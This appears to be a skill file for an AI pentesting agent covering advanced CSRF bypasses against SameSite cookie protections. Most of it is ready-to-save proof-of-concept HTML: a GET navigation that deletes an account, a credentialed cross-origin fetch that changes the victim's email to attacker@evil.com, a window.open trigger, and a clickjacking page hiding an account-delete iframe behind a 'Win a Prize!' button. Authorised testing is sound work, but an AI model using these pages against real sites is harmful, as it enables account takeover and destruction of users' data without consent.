---
name: vuln-csrf-advanced
description: "Advanced CSRF bypass — SameSite cookie bypass via navigation, click-jacking chain, CSRF via Flash redirect, subdomain CSRF bypass, sibling domain CSRF, browser-based CSRF bypass via service worker. Triggers: 'csrf advanced', 'samesite lax bypass', 'csrf navigation', 'csrf samesite bypass', 'sibling domain csrf', 'csrf via redirect', 'advanced csrf', 'csrf clickjacking'."
---

# Advanced CSRF Bypass Techniques

Bypass modern SameSite and CSRF token protections via browser quirks and domain trust.

---

## Phase 1: SameSite=Lax Bypass

```bash
TARGET="https://TARGET"

# SameSite=Lax allows cookies on top-level navigation (GET requests):
# If state-changing action uses GET:
# https://target.com/account/delete?confirm=true → share malicious link

# Lax bypass via GET-based CSRF:
cat > output/csrf_lax_get_poc.html << 'EOF'
<html>
<body>
<script>
// Top-level navigation carries SameSite=Lax cookies
window.location = "https://TARGET/api/account/delete?confirm=true";
</script>
</body>
</html>
EOF

# Lax bypass via POST within 2-minute window:
# SameSite=Lax cookies sent on top-level navigation for 2 minutes after browser restart
# This window allows classic CSRF if triggered right after login

# Chrome 80+ Lax bypass via sibling domain:
# If subdomain.target.com has XSS → CSRF using SameSite=Lax on parent
```

---

## Phase 2: SameSite=None Bypass

```bash
TARGET="https://TARGET"

# SameSite=None requires Secure — if HTTP or mixed content:
curl -s "http://TARGET/api/change-email" -c /tmp/cookies.txt
grep -i "samesite" /tmp/cookies.txt

# CORS bypass for SameSite=None cross-origin requests:
# If CORS allows attacker origin:
cat > output/csrf_none_cors_poc.html << 'EOF'
<html>
<script>
fetch("https://TARGET/api/account/settings", {
  method: "POST",
  credentials: "include",
  mode: "cors",
  body: JSON.stringify({email: "attacker@evil.com"}),
  headers: {"Content-Type": "application/json"}
});
</script>
</html>
EOF
```

---

## Phase 3: Subdomain/Sibling Domain CSRF

```bash
TARGET="https://TARGET"

# If any subdomain is compromised (XSS or takeover):
# Same-site = all subdomains. XSS on sub.target.com can CSRF target.com

# From compromised subdomain, set cookie to bypass:
# document.cookie = "csrf_token=ATTACKER_VALUE; domain=.target.com"

# CSRF via CRLF injection setting cookies:
# Inject Set-Cookie via CRLF to override CSRF token

# Flash-based CSRF (legacy):
# Old Flash redirects carry cookies regardless of SameSite — mostly patched

# CSRF via window.open navigation (Chrome quirk):
cat > output/csrf_window_poc.html << 'EOF'
<html>
<script>
// Open target in new window — carries cookies on navigation
var w = window.open("https://TARGET/csrf-vulnerable-endpoint?action=delete", "_blank");
</script>
</html>
EOF
```

---

## Phase 4: CSRF with Clickjacking

```bash
TARGET="https://TARGET"

# Clickjacking + CSRF = no user interaction bypass:
cat > output/csrf_clickjacking_poc.html << 'EOF'
<html>
<style>
iframe {
  width: 500px;
  height: 500px;
  position: absolute;
  top: 0;
  left: 0;
  opacity: 0.01;  /* invisible */
  z-index: 2;
}
button {
  position: absolute;
  top: 300px;
  left: 200px;
  z-index: 1;
}
</style>
<body>
<iframe src="https://TARGET/account/delete"></iframe>
<button>Win a Prize!</button>
</body>
</html>
EOF
# Victim clicks "Win a Prize!" which actually clicks the delete button in the iframe
```

---

## Output

Save to `output/`:
- `csrf_lax_get_poc.html` — GET-based SameSite=Lax bypass
- `csrf_none_cors_poc.html` — SameSite=None + CORS bypass
- `csrf_clickjacking_poc.html` — clickjacking CSRF chain

## Next Phase

→ `vuln-csrf` for basic CSRF first if not already done
→ `pentest-report` to document findings
